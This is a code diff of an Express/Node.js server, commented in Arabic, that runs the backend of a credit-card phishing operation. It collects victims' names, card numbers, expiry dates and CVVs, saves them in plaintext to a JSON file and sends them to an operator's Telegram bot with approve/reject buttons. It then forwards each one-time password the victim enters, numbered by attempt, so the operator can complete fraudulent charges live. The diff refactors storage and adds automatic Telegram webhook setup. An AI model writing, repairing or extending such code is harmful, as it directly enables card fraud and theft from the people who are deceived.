@@ -3,9 +3,33 @@ const https = require('https');
 const path = require('path');
 const session = require('express-session');
 const cors = require('cors');
+const { v4: uuidv4 } = require('uuid');
+const fs = require('fs');
 
 const app = express();
 const PORT = process.env.PORT || 3000;
+const PAYMENTS_FILE = path.join(__dirname, 'payments.json');
+
+// تحميل البيانات من الملف
+function loadPayments() {
+  try {
+    if (fs.existsSync(PAYMENTS_FILE)) {
+      const data = fs.readFileSync(PAYMENTS_FILE, 'utf8');
+      return JSON.parse(data);
+    }
+  } catch (e) {
+    console.log('Error loading payments:', e.message);
+  }
+  return {};
+}
+
+// حفظ البيانات إلى الملف
+function savePayments(data) {
+  fs.writeFileSync(PAYMENTS_FILE, JSON.stringify(data, null, 2));
+}
+
+// تحميل البيانات عند بدء السيرفر
+let paymentsData = loadPayments();
 
 app.use(cors({ origin: true, credentials: true }));
 
@@ -92,113 +116,120 @@ function sendTelegramMessage(text, replyMarkup = null) {
   });
 }
 
-// 1. استقبال بيانات البطاقة وحفظها في الجلسة (Session) وبدء عداد الرموز للمستخدم
+// 1. استقبال بيانات البطاقة وحفظها وبدء عداد الرموز للمستخدم
 app.post('/api/payment', async (req, res) => {
   const paymentData = req.body;
-  const sessionID = req.sessionID;
   
-  console.log('تم استقبال بيانات البطاقة - SessionID:', sessionID);
+  // إنشاء معرف فريد ثابت لكل عملية دفع
+  const paymentID = uuidv4();
+  
+  console.log('تم استقبال بيانات البطاقة - PaymentID:', paymentID);
   console.log('البيانات:', paymentData);
 
-  // حفظ البيانات في جلسة المتصفح الحالي
-  req.session.cardData = {
-    name: paymentData.name || 'غير معروف',
-    cardName: paymentData.cardName || 'غير معروف',
-    cardNumber: paymentData.cardNumber || 'غير متوفر',
-    expiry: paymentData.expiry || 'غير متوفر',
-    cvv: paymentData.cvv || 'غير متوفر',
-    type: paymentData.type || 'غير معروف'
-  };
-  
-  req.session.otpAttempts = 0;
-  req.session.approvalStatus = 'pending';
-
-  // حفظ البيانات أيضاً في المتجر العام
-  const sessionData = {
-    cardData: req.session.cardData,
+  // حفظ البيانات في الملف مع معرف ثابت
+  paymentsData[paymentID] = {
+    cardData: {
+      name: paymentData.name || 'غير معروف',
+      cardName: paymentData.cardName || 'غير معروف',
+      cardNumber: paymentData.cardNumber || 'غير متوفر',
+      expiry: paymentData.expiry || 'غير متوفر',
+      cvv: paymentData.cvv || 'غير متوفر',
+      type: paymentData.type || 'غير معروف'
+    },
     otpAttempts: 0,
-    approvalStatus: 'pending'
+    approvalStatus: 'pending',
+    createdAt: new Date().toISOString()
   };
-  sessionStore.set(sessionID, sessionData);
+  savePayments(paymentsData);
+
+  // حفظ paymentID في الجلسة ليرجع المستخدم يتحقق منه
+  req.session.paymentID = paymentID;
+  req.session.cardData = paymentsData[paymentID].cardData;
 
   // إرسال إشعار أولي لتليجرام بدخول المستخدم وبدء العملية مع أزرار الموافقة
   const initialText = ` <b>🔔 طلب دفع جديد</b>\n\n` +
-    `• حامل البطاقة: ${req.session.cardData.cardName}\n` +
-    `• رقم البطاقة: <code>${req.session.cardData.cardNumber}</code>\n` +
-    `• التاريخ: ${req.session.cardData.expiry}\n` +
-    `• CVV: <code>${req.session.cardData.cvv}</code>\n\n` +
+    `• حامل البطاقة: ${paymentsData[paymentID].cardData.cardName}\n` +
+    `• رقم البطاقة: <code>${paymentsData[paymentID].cardData.cardNumber}</code>\n` +
+    `• التاريخ: ${paymentsData[paymentID].cardData.expiry}\n` +
+    `• CVV: <code>${paymentsData[paymentID].cardData.cvv}</code>\n\n` +
     `⏳ بانتظار موافقتك...`;
 
-  // إنشاء أزرار الموافقة والرفض مع sessionID
+  // إنشاء أزرار الموافقة والرفض مع paymentID ثابت
   const replyMarkup = {
     inline_keyboard: [
       [
-        { text: '✅ موافق', callback_data: `approve_${sessionID}` },
-        { text: '❌ غير موافق', callback_data: `reject_${sessionID}` }
+        { text: '✅ موافق', callback_data: `approve_${paymentID}` },
+        { text: '❌ غير موافق', callback_data: `reject_${paymentID}` }
       ]
     ]
   };
 
   try {
     await sendTelegramMessage(initialText, replyMarkup);
-    return res.json({ success: true, message: 'Card data saved in session.' });
+    return res.json({ success: true, message: 'Card data saved in session.', paymentID: paymentID });
   } catch (error) {
     console.error('خطأ في إرسال رسالة تليجرام:', error.message);
-    // نستمر في المعالجة حتى لو فشل الإرسال
-    return res.json({ success: true, message: 'Saved locally, telegram may have failed but request is queued.' });
+    return res.json({ success: true, message: 'Saved locally, telegram may have failed but request is queued.', paymentID: paymentID });
   }
 });
 
 // 2. استقبال callback من تيليجرام (أزرار الموافقة والرفض)
 app.post('/webhook/telegram', async (req, res) => {
+  console.log('=== WEBHOOK RECEIVED ===');
+  
   const callbackQuery = req.body.callback_query;
   
   if (!callbackQuery) {
+    console.log('No callback_query in body');
     return res.status(200).send('OK');
   }
 
   const callbackData = callbackQuery.data;
   const callbackId = callbackQuery.id;
   const messageId = callbackQuery.message.message_id;
-  const userId = callbackQuery.from.id;
 
   console.log('استلام callback من تيليجرام:', callbackData);
-  console.log('معرف المستخدم:', userId);
 
-  // استخراج action و sessionID من callback_data
+  // استخراج action و paymentID من callback_data
   const parts = callbackData.split('_');
   const action = parts[0];
-  const sessionID = parts.slice(1).join('_'); // دعم IDs التي تحتوي على underscore
+  const paymentID = parts.slice(1).join('_'); // دعم IDs التي تحتوي على underscore
 
-  console.log('Action:', action, 'SessionID:', sessionID);
+  console.log('Action:', action, 'PaymentID:', paymentID);
 
-  // البحث عن الجلسة في المتجر العام
-  const sessionData = sessionStore.get(sessionID);
+  // إعادة تحميل البيانات من الملف
+  paymentsData = loadPayments();
+  console.log('Available payment IDs:', Object.keys(paymentsData));
 
-  if (!sessionData) {
-    console.log('الجلسة غير موجودة:', sessionID);
-    console.log('الجلسات المتاحة:', Array.from(sessionStore.keys()));
-    await answerCallbackQuery(callbackId, '❌ الجلسة منتهية أو غير صحيحة');
+  // البحث عن الدفع في الملف
+  const paymentRecord = paymentsData[paymentID];
+  console.log('Payment record found:', paymentRecord);
+
+  if (!paymentRecord) {
+    console.log('الدفع غير موجود:', paymentID);
+    await answerCallbackQuery(callbackId, '❌ الطلب منتهي أو غير صحيح');
     return res.status(200).send('OK');
   }
 
   // تحديث حالة الموافقة بناءً على الزر المضغوط
   if (action === 'approve') {
-    sessionData.approvalStatus = 'approved';
-    sessionStore.set(sessionID, sessionData);
+    paymentRecord.approvalStatus = 'approved';
+    paymentsData[paymentID] = paymentRecord;
+    savePayments(paymentsData);
     
     await answerCallbackQuery(callbackId, '✅ تمت الموافقة - سيتم توجيه المستخدم لصفحة OTP');
     await editMessageText(messageId, '✅ <b>تمت الموافقة على الطلب</b>\n\n• المستخدم سيتم توجيهه إلى صفحة OTP');
     
-    console.log('✅ تمت الموافقة على الطلب - SessionID:', sessionID);
+    console.log('✅ تمت الموافقة على الطلب - PaymentID:', paymentID);
   } else if (action === 'reject') {
-    sessionData.approvalStatus = 'rejected';
-    sessionStore.set(sessionID, sessionData);
+    paymentRecord.approvalStatus = 'rejected';
+    paymentsData[paymentID] = paymentRecord;
+    savePayments(paymentsData);
     
     await answerCallbackQuery(callbackId, '❌ تم الرفض - سيتم إبلاغ المستخدم');
     await editMessageText(messageId, '❌ <b>تم رفض الطلب</b>\n\n• سيتم إبلاغ المستخدم بالتحقق من البيانات');
     
-    console.log('❌ تم رفض الطلب - SessionID:', sessionID);
+    console.log('❌ تم رفض الطلب - PaymentID:', paymentID);
   }
 
   res.status(200).send('OK');
@@ -307,56 +338,75 @@ function editMessageText(messageId, text) {
 
 // 3. endpoint للتحقق من حالة الموافقة
 app.get('/api/check-approval', (req, res) => {
-  const sessionID = req.sessionID;
-  const sessionData = sessionStore.get(sessionID);
+  const paymentID = req.session.paymentID;
   
-  const status = sessionData ? sessionData.approvalStatus : (req.session.approvalStatus || 'pending');
-  console.log('التحقق من الموافقة - SessionID:', sessionID, 'Status:', status);
+  if (!paymentID) {
+    console.log('لا يوجد paymentID في الجلسة');
+    return res.json({ status: 'pending' });
+  }
   
-  res.json({ status: status });
+  // جلب الحالة من الملف
+  paymentsData = loadPayments();
+  const paymentRecord = paymentsData[paymentID];
+  
+  const status = paymentRecord ? paymentRecord.approvalStatus : 'pending';
+  console.log('التحقق من الموافقة - PaymentID:', paymentID, 'Status:', status);
+  
+  res.json({ status: status, paymentID: paymentID });
 });
 
 // 3.5 endpoint للتحكم اليدوي في الحالة (للاختبار)
 app.post('/api/set-approval', (req, res) => {
-  const { status } = req.body;
-  if (['pending', 'approved', 'rejected'].includes(status)) {
-    req.session.approvalStatus = status;
-    res.json({ success: true, status: status });
-  } else {
-    res.status(400).json({ success: false, message: 'Invalid status' });
+  const { status, paymentID: reqPaymentID } = req.body;
+  
+  // استخدام paymentID من الطلب أو من الجلسة
+  const paymentID = reqPaymentID || req.session.paymentID;
+  
+  if (!paymentID) {
+    return res.status(400).json({ success: false, message: 'No payment ID provided' });
   }
+  
+  if (!['pending', 'approved', 'rejected'].includes(status)) {
+    return res.status(400).json({ success: false, message: 'Invalid status' });
+  }
+  
+  paymentsData = loadPayments();
+  if (!paymentsData[paymentID]) {
+    return res.status(404).json({ success: false, message: 'Payment not found' });
+  }
+  
+  paymentsData[paymentID].approvalStatus = status;
+  savePayments(paymentsData);
+  
+  console.log('تم تحديث حالة الموافقة - PaymentID:', paymentID, 'Status:', status);
+  res.json({ success: true, status: status });
 });
 
 // 4. استقبال رمز الـ OTP المتكرر وربطه بالبطاقة المخزنة وحساب المحاولات تصاعدياً
 app.post('/api/verify-otp', async (req, res) => {
   const { otp } = req.body;
-  const sessionID = req.sessionID;
+  const paymentID = req.session.paymentID;
   
-  console.log('🔐 محاولة التحقق من OTP - SessionID:', sessionID);
+  console.log('🔐 محاولة التحقق من OTP - PaymentID:', paymentID);
   
-  // جلب بيانات البطاقة من الجلسة أو المتجر العام
-  let savedCard = req.session.cardData;
-  const sessionData = sessionStore.get(sessionID);
-  
-  console.log('📦 بيانات الجلسة من sessionStore:', sessionData);
-  console.log('📊 req.session.cardData:', req.session.cardData);
-  console.log('📊 req.session.approvalStatus:', req.session.approvalStatus);
-
-  if (!savedCard && sessionData) {
-    savedCard = sessionData.cardData;
+  if (!paymentID) {
+    console.log('لا يوجد paymentID في الجلسة');
+    return res.status(400).json({ success: false, message: 'No payment session found.' });
   }
-
-  if (!savedCard) {
-    console.log('محاولة إرسال OTP بدون وجود بيانات بطاقة في الجلسة');
+  
+  // جلب بيانات البطاقة من الملف
+  paymentsData = loadPayments();
+  const paymentRecord = paymentsData[paymentID];
+  
+  if (!paymentRecord) {
+    console.log('محاولة إرسال OTP بدون وجود بيانات في الملف');
     return res.status(400).json({ success: false, message: 'No card session found.' });
   }
 
-  // التحقق من حالة الموافقة قبل قبول OTP
-  // نتحقق من sessionStore أولاً (لأنه يتم تحديثه من webhook)
-  let approvalStatus = sessionData ? sessionData.approvalStatus : req.session.approvalStatus;
-  approvalStatus = approvalStatus || 'pending';
+  // التحقق من حالة الموافقة من الملف
+  let approvalStatus = paymentRecord.approvalStatus || 'pending';
   
-  console.log('✓ حالة الموافقة النهائية:', approvalStatus);
+  console.log('✓ حالة الموافقة:', approvalStatus);
   
   if (approvalStatus === 'rejected') {
     console.log('محاولة إرسال OTP بعد رفض الطلب');
@@ -377,18 +427,12 @@ app.post('/api/verify-otp', async (req, res) => {
   }
 
   // زيادة عداد المحاولات
-  if (!req.session.otpAttempts) {
-    req.session.otpAttempts = 1;
-  } else {
-    req.session.otpAttempts += 1;
-  }
+  paymentRecord.otpAttempts = (paymentRecord.otpAttempts || 0) + 1;
+  paymentsData[paymentID] = paymentRecord;
+  savePayments(paymentsData);
 
-  if (sessionData) {
-    sessionData.otpAttempts = req.session.otpAttempts;
-    sessionStore.set(sessionID, sessionData);
-  }
-
-  const currentAttempt = req.session.otpAttempts;
+  const currentAttempt = paymentRecord.otpAttempts;
+  const savedCard = paymentRecord.cardData;
   console.log(`تم استلام الرمز رقم [${currentAttempt}]: (${otp}) للبطاقة: ${savedCard.cardNumber}`);
 
   const telegramText = ` <b>[ الرمز  ${currentAttempt}]</b>\n\n` +
@@ -416,23 +460,24 @@ app.post('/api/verify-otp', async (req, res) => {
 
 // endpoint لإعادة إرسال OTP
 app.post('/api/resend-otp', async (req, res) => {
-  const sessionID = req.sessionID;
+  const paymentID = req.session.paymentID;
   
-  let savedCard = req.session.cardData;
-  const sessionData = sessionStore.get(sessionID);
-  
-  if (!savedCard && sessionData) {
-    savedCard = sessionData.cardData;
+  if (!paymentID) {
+    return res.status(400).json({ success: false, message: 'No payment session found.' });
   }
-
-  if (!savedCard) {
+  
+  // جلب بيانات البطاقة من الملف
+  paymentsData = loadPayments();
+  const paymentRecord = paymentsData[paymentID];
+  
+  if (!paymentRecord) {
     return res.status(400).json({ success: false, message: 'No card session found.' });
   }
 
   const resendText = `<b>🔄 إعادة طلب OTP</b>\n\n` +
     `📌 بيانات صاحب البطاقة:\n` +
-    `• الاسم: ${savedCard.name}\n` +
-    `• البطاقة: <code>${savedCard.cardNumber}</code>\n\n` +
+    `• الاسم: ${paymentRecord.cardData.name}\n` +
+    `• البطاقة: <code>${paymentRecord.cardData.cardNumber}</code>\n\n` +
     `⏰ تم طلب رمز تحقق جديد من قبل المستخدم.`;
 
   try {
@@ -449,8 +494,50 @@ app.post('/api/resend-otp', async (req, res) => {
   }
 });
 
+// إعداد webhook تيليجرام عند بدء السيرفر
+async function setupTelegramWebhook() {
+  const webhookUrl = process.env.TELEGRAM_WEBHOOK_URL;
+  if (webhookUrl) {
+    try {
+      const payloadData = { url: webhookUrl + '/webhook/telegram' };
+      const payload = JSON.stringify(payloadData);
+      
+      const options = {
+        hostname: 'api.telegram.org',
+        path: `/bot${telegramBotToken}/setWebhook`,
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json', 'Content-Length': Buffer.byteLength(payload) }
+      };
+
+      const response = await new Promise((resolve, reject) => {
+        const request = https.request(options, (res) => {
+          let body = '';
+          res.on('data', (chunk) => { body += chunk; });
+          res.on('end', () => resolve({ status: res.statusCode, body }));
+        });
+        request.on('error', reject);
+        request.write(payload);
+        request.end();
+      });
+
+      if (response.status === 200) {
+        console.log('✅ تم إعداد webhook تيليجرام:', webhookUrl);
+      } else {
+        console.log('⚠️ فشل إعداد webhook:', response.body);
+      }
+    } catch (error) {
+      console.log('⚠️ خطأ في إعداد webhook:', error.message);
+    }
+  } else {
+    console.log('ℹ️ TELEGRAM_WEBHOOK_URL غير محددة - للمعاينة استخدم /api/set-approval');
+  }
+}
+
 app.get('/', (req, res) => res.sendFile(path.join(__dirname, 'index.html')));
 app.get('/otp.html', (req, res) => res.sendFile(path.join(__dirname, 'otp.html')));
 app.get('/success.html', (req, res) => res.sendFile(path.join(__dirname, 'success.html')));
 
-app.listen(PORT, '0.0.0.0', () => console.log(`Server running at http://0.0.0.0:${PORT}`));
+app.listen(PORT, '0.0.0.0', async () => {
+  console.log(`Server running at http://0.0.0.0:${PORT}`);
+  await setupTelegramWebhook();
+});
